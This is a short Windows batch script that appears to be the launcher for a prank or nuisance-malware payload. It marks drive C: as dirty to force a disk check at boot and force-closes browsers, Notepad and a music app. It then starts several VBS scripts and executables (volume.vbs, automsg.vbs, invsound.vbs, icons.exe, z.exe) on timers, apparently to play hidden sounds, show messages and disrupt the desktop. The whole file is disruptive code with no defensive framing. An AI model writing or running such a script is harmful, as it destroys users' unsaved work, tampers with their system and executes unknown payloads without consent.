@echo off
fsutil dirty set C:
taskkill /f /im Music.UI.exe
taskkill /f /im chrome*
taskkill /f /im edge*
taskkill /f /im fire*
taskkill /f /im opera*
taskkill /f /im notepad*
taskkill /f /im aot*
start volume.vbs
timeout /t 4
start aot1.vbs
start automsg.vbs
timeout /t 1
start invsound.vbs
start icons.exe
start mlt.exe
timeout /t 6
start z.exe
start z.exe
start yes1.vbs
start icons.exe
timeout /t 5
taskkill /f /im notepad*